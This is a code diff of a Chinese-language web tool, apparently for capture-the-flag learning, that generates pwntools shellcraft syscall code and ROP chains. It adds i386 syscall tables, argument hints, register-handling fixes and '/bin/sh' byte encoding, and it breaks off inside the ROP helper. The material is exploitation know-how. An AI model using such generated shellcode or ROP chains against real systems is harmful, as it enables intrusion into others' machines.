"mkdirat"],[297,"mknodat"],[298,"fchownat"],[299,"futimesat"],[300,"fstatat64"],[301,"unlinkat"],[302,"renameat"],[303,"linkat"],[304,"symlinkat"],[305,"readlinkat"],[306,"fchmodat"],[307,"faccessat"],[308,"pselect6"],[309,"ppoll"],[310,"unshare"],[311,"set_robust_list"],[312,"get_robust_list"],[313,"splice"],[314,"sync_file_range"],[315,"tee"],[316,"vmsplice"],[317,"move_pages"],[318,"getcpu"],[319,"epoll_pwait"],[320,"utimensat"],[321,"signalfd"],[322,"timerfd_create"],[323,"eventfd"],[324,"fallocate"],[325,"timerfd_settime"],[326,"timerfd_gettime"],[327,"signalfd4"],[328,"eventfd2"],[329,"epoll_create1"],[330,"dup3"],[331,"pipe2"],[332,"inotify_init1"],[333,"preadv"],[334,"pwritev"],[335,"rt_tgsigqueueinfo"],[336,"perf_event_open"],[337,"recvmmsg"],[338,"fanotify_init"],[339,"fanotify_mark"],[340,"prlimit64"],[341,"name_to_handle_at"],[342,"open_by_handle_at"],[343,"clock_adjtime"],[344,"syncfs"],[345,"sendmmsg"],[346,"setns"],[347,"process_vm_readv"],[348,"process_vm_writev"],[349,"kcmp"],[350,"finit_module"],[351,"sched_setattr"],[352,"sched_getattr"],[353,"renameat2"],[354,"seccomp"],[355,"getrandom"],[356,"memfd_create"],[357,"bpf"],[358,"execveat"],[359,"socket"],[360,"socketpair"],[361,"bind"],[362,"connect"],[363,"listen"],[364,"accept4"],[365,"getsockopt"],[366,"setsockopt"],[367,"getsockname"],[368,"getpeername"],[369,"sendto"],[370,"sendmsg"],[371,"recvfrom"],[372,"recvmsg"],[373,"shutdown"],[374,"userfaultfd"],[375,"membarrier"],[376,"mlock2"],[377,"copy_file_range"],[378,"preadv2"],[379,"pwritev2"],[380,"pkey_mprotect"],[381,"pkey_alloc"],[382,"pkey_free"],[383,"statx"],[384,"arch_prctl"],[385,"io_pgetevents"],[386,"rseq"],[393,"semget"],[394,"semctl"],[395,"shmget"],[396,"shmctl"],[397,"shmat"],[398,"shmdt"],[399,"msgget"],[400,"msgsnd"],[401,"msgrcv"],[402,"msgctl"],[403,"clock_gettime64"],[404,"clock_settime64"],[405,"clock_adjtime64"],[406,"clock_getres_time64"],[407,"clock_nanosleep_time64"],[408,"timer_gettime64"],[409,"timer_settime64"],[410,"timerfd_gettime64"],[411,"timerfd_settime64"],[412,"utimensat_time64"],[413,"pselect6_time64"],[414,"ppoll_time64"],[416,"io_pgetevents_time64"],[417,"recvmmsg_time64"],[418,"mq_timedsend_time64"],[419,"mq_timedreceive_time64"],[420,"semtimedop_time64"],[421,"rt_sigtimedwait_time64"],[422,"futex_time64"],[423,"sched_rr_get_interval_time64"]];
 SYS64.forEach(function(s){ if(s.nr>=424) NR32.push([s.nr, s.name]); });
 // i386 同名调用有旧 16 位版和 *32 版两套号（如 getuid 24 是旧版、199 才是现在的 getuid32）：按名查找必须返回 *32 版，所以建表时把旧号去掉，只留 190-220 段的现代号
 var NR32_KEEP = (function(){
@@ -792,6 +842,16 @@ function multiCanon(sys,k){
   var f=freeSaveCanons(sys);
   if(f[k-1]) return f[k-1];
   if(sys.name==="mount" && k===2) return "rdi";
+  // 6 参数 i386 调用（如 setxattrat/getxattrat）：6 个参数寄存器全被占，没有空闲寄存器可存字符串指针。
+  // 退路：把字符串指针直接放进它自己的最终参数寄存器——压栈后立即 mov 进去，再把这个寄存器本身传给 syscall()。
+  // 这样指针以寄存器值的形式进 shellcraft.syscall 的 setregs 依赖图：setregs 看到源=目的会跳过这一步，
+  // 其它参数的 mov 也不会覆盖它；比另找暂存寄存器更稳。返回的是规范名，显示/生成时再经 physOf 换算。
+  var ownIdx = STR_MULTI[sys.name] && STR_MULTI[sys.name].idx[k];
+  if(ownIdx !== undefined){
+    var phys = REGS32[ownIdx]; // 该字符串参数最终所在的 i386 寄存器
+    var back = {ebx:"rbx",ecx:"rcx",edx:"rdx",esi:"r12",edi:"r13",ebp:"r14"}[phys];
+    if(back) return back;
+  }
   return null;
 }
 function str2Canon(sys){ if(arch!=="i386") return "r13"; var f=freeSaveCanons(sys); return f[0]||"r13"; }
@@ -829,7 +889,7 @@ var HINTS={
  "mmap:addr":["fix","固定值：填 0 让内核自己选地址",["0"]],
  "mmap:len":["len","自己定长度：映射多少字节，一页是 0x1000",["0x1000","0x100"]],
  "mmap:prot":["cons","常量查表：PROT_READ=1, WRITE=2, EXEC=4，可相加，RWX=7",["1","3","7"]],
- "mmap:flags":["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22",["2","0x22","1"]],
+ "mmap:flags":["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22。注意配对：flags 含 0x20（匿名）时 fd 必须改填 -1，匿名映射不需要 fd；只有文件映射（flags 不含 0x20，如 2）才填 open 返回的 'rax'。本页 open→mmap→write 模板默认就是文件映射：flags=2 + fd='rax'，别单独把 flags 改成 0x22 而不改 fd。",["2","0x22","1"]],
  "mmap:fd":["rax","上一步 rax 返回：open 返回的 fd 还在 rax 里就填 'rax'；匿名映射填 -1",["'rax'","-1","3"]],
  "mmap:off":["fix","固定值：从文件开头映射填 0",["0"]],
  "open:filename":["str","字符串指针，不能直填字符串、更不是长度！本页已自动生成 pushstr（上面框里填路径，默认 flag），这里传 'rsp'；或改用 shellcraft.open('flag',0,0) 封装",["'rsp'"]],
@@ -1005,7 +1065,7 @@ function raxAfter(name){var t=RAX_AFTER[name]||"rax = 返回值（成功 ≥ 0�
 HINTS["mmap2:addr"]=["fix","固定值：填 0 让内核自己选地址",["0"]];
 HINTS["mmap2:len"]=["len","自己定长度：映射多少字节，一页是 0x1000",["0x1000","0x100"]];
 HINTS["mmap2:prot"]=["cons","常量查表：PROT_READ=1, WRITE=2, EXEC=4，可相加，RWX=7",["1","3","7"]];
-HINTS["mmap2:flags"]=["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22",["2","0x22","1"]];
+HINTS["mmap2:flags"]=["cons","常量查表：MAP_PRIVATE=2，MAP_ANONYMOUS=0x20，匿名私有=0x22。注意配对：flags 含 0x20（匿名）时 fd 必须改填 -1，匿名映射不需要 fd；只有文件映射才填 open 返回的 'rax'。",["2","0x22","1"]];
 HINTS["mmap2:fd"]=["rax","上一步 rax 返回：open 返回的 fd 还在 rax 里就填 'rax'；匿名映射填 -1",["'rax'","-1","3"]];
 HINTS["mmap2:pgoff"]=["fix","偏移，单位是页（0x1000 字节）不是字节：从文件开头映射填 0",["0"]];
 RAX_AFTER["mmap2"]="rax = 映射区的起始地址（fd 已被覆盖，之后要用先 mov 保存）";
@@ -1023,6 +1083,7 @@ HINTS["signalfd4:sizemask"]=["fix","固定值，不是长度：sizemask = sizeof
 // clone3 / openat2 的 size 是结构体大小，不是数据长度
 HINTS["clone3:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct clone_args)，当前版本（VER2）固定 88（0x58）。填小了内核只认结构体前面的字段，填大了会 EFAULT。本页已默认填 88",["88"]];
 HINTS["openat2:size"]=["fix","结构体大小，不是数据长度：size = sizeof(struct open_how) = 24（0x18），固定值。本页已默认填 24",["24"]];
+HINTS["epoll_create:size"]=["fix","遗留参数，不是长度：自 Linux 2.6.8 起 size 已被内核忽略，只要求大于 0（填 0 或负数会 EINVAL），填 1 即可；不要按“要监听几个 fd”去估算，也不要套长度三选一。本页已默认填 1",["1"]];
 // 个数类：是数组/表格的元素个数，不是字节长度，不给长度三选一
 HINTS["poll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应（只查 1 个 fd 就填 1）。跟每个 fd 上有多少数据没关系",["1","2","3"]];
 HINTS["ppoll:nfds"]=["cnt","元素个数，不是字节长度：ufds 数组里有几个 pollfd 就填几，必须和数组一一对应",["1","2","3"]];
@@ -1046,12 +1107,19 @@ HINTS["getgroups:gidsetsize"]=["cnt","元素个数，不是字节长度，必须
 HINTS["setgroups:gidsetsize"]=["cnt","元素个数，不是字节长度：等于你已经在 grouplist 数组里准备好的 gid 个数，必须一一对应；填 0（数组可为 NULL）= 清空所有附加组",["0","1","2"]];
 HINTS["eventfd:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。注意 NR 284 的 eventfd 只有这 1 个参数、没有 flags——带 flags 的是 NR 290 eventfd2，别把 libc 包装签名套到 284 上",["0"]];
 HINTS["eventfd2:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。flags 是 eventfd2(290) 才有的第二个参数",["0"]];
+HINTS["i386:eventfd:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。注意 NR 323 的 eventfd 只有这 1 个参数、没有 flags——带 flags 的是 NR 328 eventfd2，别把 libc 包装签名套到 323 上",["0"]];
+HINTS["i386:eventfd2:initval"]=["fix","计数器初值 initval，根本不是长度：eventfd 内部计数器从这个值开始，通常填 0。flags 是 eventfd2(328) 才有的第二个参数",["0"]];
 // 多字符串调用：每个字符串都单独 pushstr（mount 三个、xattr 家族两个、add_key/request_key）
 HINTS["mount:dev_name"]=["str","字符串指针 #1（源设备/文件系统名，如 tmpfs 就填 tmpfs）：本页自动 pushstr，传 'rsp'。mount 一共有三个字符串，别只压这一个",["'rsp'"]];
 HINTS["mount:dir_name"]=["str","字符串指针 #2（挂载点目录，如 /mnt/target，目录要先存在）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑，是 'ebp'）",[]];
 HINTS["mount:type"]=["str","字符串指针 #3（文件系统类型，如 tmpfs / ext4）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的值（amd64 是 'r14'；i386 没有第二个空闲寄存器，走手动 mov 顺序生成，参数框里填的是暂存寄存器 'edi'，别自己改）",[]];
 ["setxattr","lsetxattr","getxattr","lgetxattr","removexattr","lremovexattr"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 按这个调用没用到的参数寄存器挑——setxattr/lsetxattr 的 flags 占着 edi，所以挑 'ebp'，别填 'edi'，会被 flags 覆盖）。只压 path 不压 name 的话这个参数会指错地方",[]]; });
 ["setxattrat","getxattrat","removexattrat"].forEach(function(sn){ HINTS[sn+":name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'）",[]]; });
+// setxattrat/getxattrat 的 i386 版是 6 参数（新版 *xattrat 签名多了 at_flags 和 args 结构体指针）：
+// 6 个参数寄存器全被占，没有空闲保存寄存器，name 直接进它自己的最终参数寄存器 esi（见 multiCanon 的退路）。
+// removexattrat 只有 4 个参数，ebp 空闲，走正常保存寄存器，不受影响。
+HINTS["setxattrat:name"]=["str","字符串指针 #2（扩展属性名，如 user.myattr）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 下这个调用 6 个参数占满寄存器、没有空闲保存寄存器，name 压栈后直接 mov esi, esp，进它自己的参数寄存器传 'esi'，setregs 会跳过这一步）",[]];
+HINTS["getxattrat:name"]=HINTS["setxattrat:name"];
 HINTS["add_key:_type"]=["str","字符串指针 #1（key 类型，如 user / keyring）：本页自动 pushstr，传 'rsp'",["'rsp'"]];
 HINTS["add_key:_description"]=["str","字符串指针 #2（key 的名字）：本页已先把它 pushstr 并 mov 到保存寄存器保存，传参数框里已填好的那个保存寄存器（amd64 是 'r13'；i386 是 'ebp'——add_key 的 keyring 参数占着 edi）",[]];
 HINTS["request_key:_type"]=["str","字符串指针 #1（key 类型，如 user）：本页自动 pushstr，传 'rsp'",["'rsp'"]];
@@ -1068,6 +1136,21 @@ HINTS["pipe2:fildes"]=["rax","输出数组指针：和 pipe 一样，fildes 指�
 HINTS["pipe2:flags"]=["cons","标志位：0 = 无；O_CLOEXEC=0x80000（exec 时自动关）、O_NONBLOCK=0x800（非阻塞），可相加",["0","0x80000"]];
 RAX_AFTER["pipe"]="rax = 0 成功 / 负数 = -errno；两个新 fd 不在 rax 里，在 fildes 指向的数组里：[0]=读端，[1]=写端";
 RAX_AFTER["pipe2"]="rax = 0 成功 / 负数 = -errno；两个新 fd 不在 rax 里，在 fildes 指向的数组里：[0]=读端，[1]=写端";
+RAX_AFTER["open_tree"]="rax = 新的 fd（open_tree 返回的文件描述符）";
+RAX_AFTER["fsopen"]="rax = 新的文件系统上下文 fd";
+RAX_AFTER["fspick"]="rax = 新的文件系统上下文 fd";
+RAX_AFTER["pidfd_open"]="rax = 新的 pidfd";
+RAX_AFTER["signalfd"]="rax = 新的 signalfd";
+RAX_AFTER["signalfd4"]="rax = 新的 signalfd";
+RAX_AFTER["userfaultfd"]="rax = 新的 userfaultfd";
+RAX_AFTER["landlock_create_ruleset"]="rax = 新的 landlock ruleset fd";
+RAX_AFTER["inotify_init1"]="rax = 新的 inotify fd";
+RAX_AFTER["pidfd_getfd"]="rax = 新的 fd（从目标进程复制来的 fd）";
+RAX_AFTER["io_uring_setup"]="rax = 新的 io_uring fd";
+RAX_AFTER["fanotify_init"]="rax = 新的 fanotify fd";
+RAX_AFTER["brk"]="rax = 新的堆顶地址（brk 返回值）";
+RAX_AFTER["mremap"]="rax = 新映射区的起始地址";
+RAX_AFTER["shmat"]="rax = 共享内存段的挂接地址";
 HINTS["mmap:arg"]=["rax","i386 专属：老式 mmap 只有一个参数，它是指向 mmap_arg_struct 结构体的指针，不是 amd64 的 6 个寄存器参数。结构体里依次是 6 个 4 字节：addr, len, prot, flags, fd, offset。先在栈上按倒序把这 6 个值压好（先压 offset，最后压 addr），栈顶就是结构体地址，这里填 'esp'。填 0 是错的：内核会去地址 0 读结构体，直接出错",["'esp'"]];
 HINTS["poll:timeout_msecs"]=["fix","超时时间，单位是毫秒，不是字节长度、更没有三选一：-1 = 一直等到有事件，0 = 立刻返回只看一眼，1000 = 最多等 1 秒",["-1","0","1000"]];
 HINTS["epoll_wait:timeout"]=["fix","超时时间，单位是毫秒，不是字节长度：-1 = 一直等，0 = 立刻返回，1000 = 最多等 1 秒",["-1","0","1000"]];
@@ -1078,7 +1161,7 @@ HINTS["listen:backlog"]=["fix","等待队列的个数，不是字节长度：还
 
 var cur=null, chain=[], lastFocus=null;
 var lastLenValue="0x100";
-function isLenName(n, sysName){ n=(n||"").toLowerCase(); if(/vlen|nr_segs|liovcnt|riovcnt|sigsetsize|sizemask|gidsetsize|initval|nfds|nsops|nsems|nr_|maxevents/.test(n)) return false; if((sysName==="eventfd"||sysName==="eventfd2") && n==="count") return false; if((sysName==="clone3"||sysName==="openat2") && n==="size") return false; return /count|len|size|bufsiz|nbytes|msgsz/.test(n); }
+function isLenName(n, sysName){ n=(n||"").toLowerCase(); if(/vlen|nr_segs|liovcnt|riovcnt|sigsetsize|sizemask|gidsetsize|initval|nfds|nsops|nsems|nr_|maxevents/.test(n)) return false; if((sysName==="eventfd"||sysName==="eventfd2") && n==="count") return false; if((sysName==="clone3"||sysName==="openat2"||sysName==="epoll_create") && n==="size") return false; return /count|len|size|bufsiz|nbytes|msgsz/.test(n); }
 function computePrevLen(){
   for(var k=chain.length-1;k>=0;k--){ var s=chain[k]; if(!s||s.isSave||!s.vals) continue;
     var so=SYS64.find(function(x){return x.name===s.name;})||SYS.find(function(x){return x.name===s.name;}); if(!so) continue;
@@ -1101,6 +1184,13 @@ function fmtVal(v){
     return "'"+unq+"'";
   }
   return v;
+}
+// asm 预览只认十进制 / 0x 十六进制立即数：shellcraft 代码里合法的 Python 八进制 0o777 在汇编里是非法的，
+// 这里单独转十进制。只转 0o 形式，0x / 十进制 / 寄存器原样不动；常量速查表里的 0o777 显示本身没错，不动它。
+function asmVal(v){
+  var f=fmtVal(v).replace(/'/g,"");
+  if(/^0o[0-7]+$/i.test(f.trim())) return String(parseNum(f));
+  return f;
 }
 function buildCode(sys, vals){
   var parts=vals.map(fmtVal);
@@ -1157,8 +1247,12 @@ function buildFullCode(sys, vals){
     for(var k=0;k<multi.idx.length;k++){
       var canon=multiCanon(sys,k);
       if(!strs[k]){ vals2[multi.idx[k]]="0"; use[k]=false; } // 空字符串：这个参数直接传 0，不连累其它字符串的 pushstr
-      else if(canon && fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'") use[k]=true;
-      else use[k]=false; // 用户改成了别的寄存器（或这个架构下没有空闲保存寄存器）：这个字符串手动处理，其余照常自动压
+      else if(canon && (fmtVal(vals[multi.idx[k]])==="'"+physOf(canon)+"'" || vals[multi.idx[k]]==="" || fmtVal(vals[multi.idx[k]])==="0")){
+        // 字符串框填了、参数框还是空/0（默认没预填，或用户清空了）：自动用保存寄存器（或 6 参数 i386 下的最终寄存器）补上，
+        // 不能静默丢掉这个字符串。用户明确改成别的寄存器时才走手动处理。
+        vals2[multi.idx[k]]="'"+physOf(canon)+"'"; use[k]=true;
+      }
+      else use[k]=false; // 用户改成了别的寄存器：这个字符串手动处理，其余照常自动压
     }
     if(arch==="i386" && sys.name==="mount" && use[1] && use[2] && (use[0]||!strs[0])){
       var man=mountManual32(sys, vals, strs, use);
@@ -1178,8 +1272,10 @@ function buildFullCode(sys, vals){
   if(two){
     var s1=($("strInput").value||"").trim(), s2=($("strInput2").value||"").trim();
     var savePhys=physOf(str2Canon(sys)), vals3=vals.slice();
-    var useA=!!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'";
-    var useB=!!s2 && fmtVal(vals[two.b])==="'"+savePhys+"'";
+    var useA=!!s1 && (fmtVal(vals[two.a])==="'"+spReg()+"'" || vals[two.a]==="" || fmtVal(vals[two.a])==="0");
+    var useB=!!s2 && (fmtVal(vals[two.b])==="'"+savePhys+"'" || vals[two.b]==="" || fmtVal(vals[two.b])==="0");
+    if(useA) vals3[two.a]="'"+spReg()+"'";
+    if(useB) vals3[two.b]="'"+savePhys+"'";
     // 和多字符串一样逐个处理：某个框留空 = 只有那个参数传 0，另一个照常 pushstr。
     // 旧逻辑是任一为空就整段丢掉 pushstr、参数却还留着 'rsp'/保存寄存器，会传错指针（如 rename 把文件重命名到自身还返回 0）。
     if(!s1 && fmtVal(vals[two.a])==="'"+spReg()+"'") vals3[two.a]="0";
@@ -1198,8 +1294,11 @@ function buildFullCode(sys, vals){
     if(fmtVal(vals[idx])==="'"+spReg()+"'"){ var v0=vals.slice(); v0[idx]="0"; return buildCode(sys, v0); }
     return code;
   }
-  if(fmtVal(vals[idx])!=="'"+spReg()+"'") return code;
-  return "sc += shellcraft.pushstr('"+escStr(sv)+"')\n"+code;
+  if(fmtVal(vals[idx])!=="'"+spReg()+"'" && vals[idx]!=="" && fmtVal(vals[idx])!=="0") return code;
+  // 字符串框填了、参数框还是空/0：自动把参数补成 rsp/esp 再 pushstr，不能静默丢掉字符串；明确改成别的寄存器时才走手动处理
+  var vv=vals.slice();
+  if(fmtVal(vv[idx])!=="'"+spReg()+"'") vv[idx]="'"+spReg()+"'";
+  return "sc += shellcraft.pushstr('"+escStr(sv)+"')\n"+buildCode(sys, vv);
 }
 function currentVals(){return Array.prototype.map.call(document.querySelectorAll(".arg-input"),function(i){return i.value;});}
 
@@ -1212,7 +1311,7 @@ function select(sys){
   $("regMap").innerHTML="<span><b>"+axReg()+"</b> = "+sys.nr+" (SYS_"+sys.name+")</span>"+sys.args.map(function(a,i){return "<span>ARG"+i+" <b>"+REGS[i]+"</b> = "+argName(a)+"</span>";}).join("");
   var warn=$("warnBox");
   if(STR_MULTI[sys.name]){
-    warn.textContent=archText("这个调用有 "+STR_MULTI[sys.name].idx.length+" 个字符串参数，每个都要单独 pushstr，不能共用一个 'rsp'，更不能只压第一个：生成顺序是先 pushstr 最后一个字符串并 mov 保存，最后 pushstr 第一个字符串传 'rsp'。每个字符串改上面对应的框，某个框留空 = 那个参数直接传 0，不影响其它字符串；把任一字符串参数改成别的寄存器时，那个字符串的 pushstr 会自动去掉，要自己保证字符串已经在那个地址。")+(arch==="i386" ? (sys.name==="mount" ? "i386 特别说明：mount 有 5 个参数，只剩 ebp 一个空闲寄存器，两个保存位不够——本页改走手动 mov 顺序生成（type 先暂存 edi、搬进 edx 之后 edi 才放 data，dir 存 ebp），不经 shellcraft.syscall，不依赖它内部 mov 的顺序。" : "i386 特别说明：保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）——比如 setxattr 的 flags 占着 edi，就改存 ebp，不会再被 flags 的赋值覆盖；mount 的 data 占 ebp 的情况同理。") : "");
+    warn.textContent=archText("这个调用有 "+STR_MULTI[sys.name].idx.length+" 个字符串参数，每个都要单独 pushstr，不能共用一个 'rsp'，更不能只压第一个：生成顺序是先 pushstr 最后一个字符串并 mov 保存，最后 pushstr 第一个字符串传 'rsp'。每个字符串改上面对应的框，某个框留空 = 那个参数直接传 0，不影响其它字符串；把任一字符串参数改成别的寄存器时，那个字符串的 pushstr 会自动去掉，要自己保证字符串已经在那个地址。")+(arch==="i386" ? (sys.name==="mount" ? "i386 特别说明：mount 有 5 个参数，只剩 ebp 一个空闲寄存器，两个保存位不够——本页改走手动 mov 顺序生成（type 先暂存 edi、搬进 edx 之后 edi 才放 data，dir 存 ebp），不经 shellcraft.syscall，不依赖它内部 mov 的顺序。" : "i386 特别说明：保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）——比如 setxattr 的 flags 占着 edi，就改存 ebp，不会再被 flags 的赋值覆盖；mount 的 data 占 ebp 的情况同理。6 参数调用（如 setxattrat/getxattrat）没有空闲寄存器时，字符串直接进它自己的最终参数寄存器（name 进 esi），不另找保存寄存器。") : "");
     warn.classList.add("show");
   } else if(STR2[sys.name]){
     warn.textContent=archText("这个调用有两个文件名参数，都是指针，不能直填字符串。生成顺序是：先 pushstr 第二个名字（新名）并 mov "+str2Canon(sys)+", rsp 保存，再 pushstr 第一个名字（旧名）传 'rsp'。两个名字分别改上面两个框，某个框留空 = 只有那个参数传 0，另一个照常 pushstr（旧版任一为空会把两个都丢掉、参数还指着没压栈的位置）；把任一参数改成别的寄存器时，pushstr 会自动去掉，那种情况要自己保证字符串已经在那个地址。")+(arch==="i386" ? archText("i386 的保存寄存器按这个调用没用到的参数寄存器挑（参数框里已填好）：renameat2/linkat/move_mount 的 flags 占着 edi，所以存 ebp，不会被覆盖。") : "");
@@ -1256,7 +1355,7 @@ function select(sys){
   if(!sys.args.length){box.innerHTML='<p class="empty">这个调用没有参数，直接生成即可。</p>';}
   else box.innerHTML=sys.args.map(function(a,i){
     var an=argName(a), at=argType(a);
-    var h=HINTS[sys.name+":"+an]||genericHint(sys.name,an,at);
+    var h=(HINTS[arch+":"+sys.name+":"+an]||HINTS[sys.name+":"+an]||genericHint(sys.name,an,at));
     var chips=(h[2]||[]).map(function(c){return '<button data-v="'+c+'">'+archText(c)+'</button>';}).join("");
     var lenSrc="";
     if(h[0]==="len"){
@@ -1268,7 +1367,7 @@ function select(sys){
     }
     var autoSrc="";
     var anL=an.toLowerCase();
-    if(/fd|fildes/.test(anL) && anL!=="dfd" && !/fds$/.test(anL)){
+    if(/fd|fildes/.test(anL) && anL!=="dfd" && !/fds$/.test(anL) && at.indexOf("*")<0){ // 带 * 的是指针参数（如 pipe 的 fildes 是输出数组地址），不是 fd 编号，不给“fd 从哪来”面板
       autoSrc='<div class="len-src"><p class="ls-title">这个 fd（编号）从哪来？点一个直接填，不用看说明</p>'
         +'<div class="ls-row">操作终端/屏幕：<button data-autofill="0">0 · 键盘输入</button><button data-autofill="1">1 · 屏幕输出</button><button data-autofill="2">2 · 报错输出</button><span>这三个是系统定死的：0=stdin 输入，1=stdout 输出，2=stderr 报错</span></div>'
         +'<div class="ls-row">操作刚打开的文件：<button data-autofill="rax">填 \''+axReg()+'\'</button><span>上一步 open/openat 打开文件后，fd 就放在 '+axReg()+' 里。前提：中间没插别的系统调用，不然 '+axReg()+' 已经被改掉了</span></div>'
@@ -1304,10 +1403,13 @@ function select(sys){
     var multi2=STR_MULTI[sys.name];
     if(multi2){
       var rr=strMultiRegs(sys);
-      multi2.idx.forEach(function(ix,k){ if((multi2.def[k]||"")==="") return; if(inputs[ix] && !inputs[ix].value && rr[k]) inputs[ix].value=dispVal(rr[k]); });
+      // 每个字符串参数框默认填保存寄存器（第 3 个可选字符串的默认值是空串时也照填：字符串框空着时生成会把参数强制成 0，
+      // 不影响；用户一旦在字符串框里填了内容，参数框已经是保存寄存器，pushstr 不会丢。之前按默认值跳过，
+      // 导致 request_key 的 _callout_info 这类可选字符串填了内容却丢 pushstr。）
+      multi2.idx.forEach(function(ix,k){ if(inputs[ix] && !inputs[ix].value && rr[k]) inputs[ix].value=dispVal(rr[k]); });
     }
     // sigsetsize/sizemask 写死默认 8、clone3/openat2 的结构体 size 写死默认、eventfd/eventfd2 的 initval 默认 0（都不是长度，别让用户自己猜）
-    sys.args.forEach(function(a,j){ var an2=argName(a); if(!inputs[j] || inputs[j].value) return; if(an2==="sigsetsize"||an2==="sizemask") inputs[j].value="8"; else if(an2==="size" && sys.name==="clone3") inputs[j].value="88"; else if(an2==="size" && sys.name==="openat2") inputs[j].value="24"; else if(an2==="initval" && (sys.name==="eventfd"||sys.name==="eventfd2")) inputs[j].value="0"; });
+    sys.args.forEach(function(a,j){ var an2=argName(a); if(!inputs[j] || inputs[j].value) return; if(an2==="sigsetsize"||an2==="sizemask") inputs[j].value="8"; else if(an2==="size" && sys.name==="clone3") inputs[j].value="88"; else if(an2==="size" && sys.name==="openat2") inputs[j].value="24"; else if(an2==="size" && sys.name==="epoll_create") inputs[j].value="1"; else if(an2==="initval" && (sys.name==="eventfd"||sys.name==="eventfd2")) inputs[j].value="0"; });
   })();
   document.querySelectorAll(".arg-input").forEach(function(inp){
     inp.addEventListener("input",render);
@@ -1425,7 +1527,11 @@ function asmPreviewText(sys, vals){
       if(l.indexOf("'mov ")>=0||l.indexOf('"mov ')>=0) lines.push("; "+l.replace("sc += ",""));
     });
   }
-  vals.forEach(function(v,i){ lines.push("mov "+REGS[i]+", "+fmtVal(v).replace(/'/g,"")); });
+  vals.forEach(function(v,i){
+    var av=asmVal(v);
+    if(av===REGS[i]) lines.push("; "+REGS[i]+" 已是 "+av+"（setregs 会跳过这一步，不用再 mov）");
+    else lines.push("mov "+REGS[i]+", "+av);
+  });
   lines.push("mov "+axReg()+", "+sys.nr+(arch==="i386"?"":"  ; SYS_"+sys.name));
   lines.push(arch==="i386" ? "int 0x80" : "syscall");
   lines.push("");
@@ -1463,7 +1569,7 @@ $("strInput2").addEventListener("input",render);
 $("strInput3").addEventListener("input",render);
 $("asmBtn").addEventListener("click",function(){
   var n=$("asmNote"), p=$("asmPreview"); if(!cur)return;
-  var lines=currentVals().map(function(v,i){return REGS[i]+" ← "+(fmtVal(v));});
+  var lines=currentVals().map(function(v,i){return REGS[i]+" ← "+(asmVal(v));});
   n.innerHTML="pwntools 生成汇编的顺序：先把参数搬进寄存器（"+(lines.join("，")||"无参数")+"），<b>最后</b>才把 "+axReg()+" 改成调用号 "+cur.nr+"，所以参数里用 '"+axReg()+"' 不会被覆盖。执行完之后："+raxAfter(cur.name);
   var show=n.style.display==="none";
   n.style.display=show?"block":"none";
@@ -1472,12 +1578,12 @@ $("asmBtn").addEventListener("click",function(){
 });
 
 // 链
-var FD_PRODUCERS={open:1,openat:1,openat2:1,socket:1,accept:1,accept4:1,dup:1,dup2:1,dup3:1,eventfd:1,eventfd2:1,timerfd_create:1,inotify_init:1,epoll_create:1,epoll_create1:1,memfd_create:1};
-var ADDR_PRODUCERS={mmap:1,mmap2:1};
+var FD_PRODUCERS={open:1,openat:1,openat2:1,socket:1,accept:1,accept4:1,dup:1,dup2:1,dup3:1,eventfd:1,eventfd2:1,timerfd_create:1,inotify_init:1,epoll_create:1,epoll_create1:1,memfd_create:1,open_tree:1,fsopen:1,fspick:1,pidfd_open:1,signalfd:1,signalfd4:1,userfaultfd:1,landlock_create_ruleset:1,inotify_init1:1,pidfd_getfd:1,io_uring_setup:1,fanotify_init:1};
+var ADDR_PRODUCERS={mmap:1,mmap2:1,brk:1,mremap:1,shmat:1};
 function isSaveStep(s){ return s && s.isSave; }
 function saveWarningFor(i){
   var s=chain[i]; if(!s||isSaveStep(s)) return null;
-  var kind = FD_PRODUCERS[s.name] ? "fd" : (ADDR_PRODUCERS[s.name] ? "映射地址" : null);
+  var kind = FD_PRODUCERS[s.name] ? "fd" : (ADDR_PRODUCERS[s.name] ? (s.name==="brk" ? "堆顶地址" : "映射地址") : null);
   if(!kind) return null;
   if(i>=chain.length-1) return null;
   if(isSaveStep(chain[i+1])) return null;
@@ -1709,25 +1815,70 @@ function valEq(user, ans){
 
 // ===== ROP 链模式（4.1 / 4.2 / 4.3）=====
 var ropTpl="41";
+var ropPrim="unknown"; // gets | read-fixed | read-stream | unknown
+function ropZerosU32(n){ n=n>>>0; var c=0; for(var i=0;i<4;i++){ if(((n>>(i*8))&0xff)===0) c++; } return c; }
+function ropZerosVals(vals){ var c=0; for(var i=0;i<vals.length;i++){ var n=parseNum(String(vals[i])); if(n!==null) c+=ropZerosU32(n); } return c; }
+function ropPyBytes(chunk){ // byte-number array -> python bytes literal, e.g. b'/bin' / b'/sh\x00'
+  var s="";
+  for(var i=0;i<chunk.length;i++){ var b=chunk[i];
+    if(b===0x5c) s+="\\\\";
+    else if(b===0x27) s+="\\'";
+    else if(b>=0x20 && b<=0x7e) s+=String.fromCharCode(b);
